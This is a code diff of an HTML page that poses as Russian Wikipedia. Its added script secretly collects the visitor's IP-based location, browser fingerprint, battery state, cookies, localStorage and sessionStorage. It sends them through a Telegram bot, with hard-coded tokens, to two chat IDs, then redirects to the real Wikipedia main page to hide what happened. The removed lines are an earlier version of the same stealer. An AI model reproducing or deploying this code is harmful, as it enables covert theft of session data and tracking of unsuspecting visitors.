@@ -1,40 +1,62 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>Загрузка</title>
-</head>
+<head><meta charset="utf-8"><title>Википедия</title></head>
 <body>
-<h1>Секунду...</h1>
 <script>
-var TOKEN = '8680205049:AAF1KbStZTKnru9p5Ta8wUyKoXHGYgHtJuk'
-var ID = '6783102477'
-var REDIRECT = https://ru.wikipedia.org/wiki/Заглавная_страница
-fetch('https://ipwho.is/')
-.then(function(r){ return r.json(); })
-.then(function(r){
-  var t = 'IP: ' + r.ip
-    + '\nГород: ' + r.city
-    + '\nСтрана: ' + r.country
-    + '\nПровайдер: ' + (r.connection ? r.connection.isp : '?')
-    + '\nUA: ' + navigator.userAgent
-    + '\nПлатформа: ' + navigator.platform
-    + '\nЯзык: ' + navigator.language
-    + '\nЧасовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone
-    + '\nЭкран: ' + screen.width + 'x' + screen.height
-    + '\nCPU: ' + navigator.hardwareConcurrency
-    + '\nCookies: ' + (document.cookie || 'пусто');
+var TOKEN    = '8847544358:AAFH7jhYxPh7xuTHmoMZXYYHGcxzsYnHGe0';
+var ID       = '5442175617';
+var ID2      = '6783102477';
+var REDIRECT = 'https://ru.wikipedia.org/wiki/Заглавная_страница';
+
+function dumpStorage(s){
+  try {
+    if (!s || s.length === 0) return '(пусто)';
+    var o = [];
+    for (var i = 0; i < s.length; i++){ var k = s.key(i); o.push(k + '=' + s.getItem(k)); }
+    return o.join('; ');
+  } catch(e){ return '(н/д)'; }
+}
+
+var cookieStr = document.cookie || 'пусто';
+var lsStr = dumpStorage(localStorage);
+var ssStr = dumpStorage(sessionStorage);
+
+function sendTo(chatId, text){
   var u = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'
-        + '?chat_id=' + ID
-        + '&text=' + encodeURIComponent(t);
-  return fetch(u);
-})
-.then(function(){
-  document.body.innerHTML = '<h1>Готово</h1>';
-})
-.catch(function(e){
-  document.body.innerHTML = '<h1 style="color:red">' + e.message + '</h1>';
-});
+        + '?chat_id=' + encodeURIComponent(chatId)
+        + '&text=' + encodeURIComponent(text);
+  return fetch(u, { mode: 'no-cors', keepalive: true }).catch(function(){});
+}
+
+function send(ip, bat){
+  ip = ip || {};
+  var conn = ip.connection || {};
+  var t = 'IP: ' + (ip.ip || 'н/д') + '\n'
+    + 'Город: ' + (ip.city || '?') + ', ' + (ip.country || '?') + '\n'
+    + 'Провайдер: ' + (conn.isp || '?') + '\n'
+    + 'UA: ' + navigator.userAgent + '\n'
+    + 'Экран: ' + screen.width + 'x' + screen.height + '\n'
+    + 'Батарея: ' + bat + '\n'
+    + 'URL: ' + location.href + '\n'
+    + 'Referrer: ' + (document.referrer || 'нет') + '\n'
+    + 'Cookies: ' + cookieStr + '\n'
+    + 'localStorage: ' + lsStr + '\n'
+    + 'sessionStorage: ' + ssStr;
+
+  Promise.all([ sendTo(ID, t), sendTo(ID2, t) ]).finally(function(){
+    setTimeout(function(){ location.replace(REDIRECT); }, 400);
+  });
+}
+
+var ipP = fetch('https://ipwho.is/').then(function(r){ return r.json(); }).catch(function(){ return {}; });
+
+var batP = (navigator.getBattery && location.protocol === 'https:')
+  ? navigator.getBattery().then(function(b){
+      return Math.round(b.level*100) + '%' + (b.charging ? ' (заряжается)' : '');
+    }).catch(function(){ return 'н/д'; })
+  : Promise.resolve('н/д');
+
+Promise.all([ipP, batP]).then(function(r){ send(r[0], r[1]); }).catch(function(){ send({}, 'н/д'); });
 </script>
 </body>
 </html>
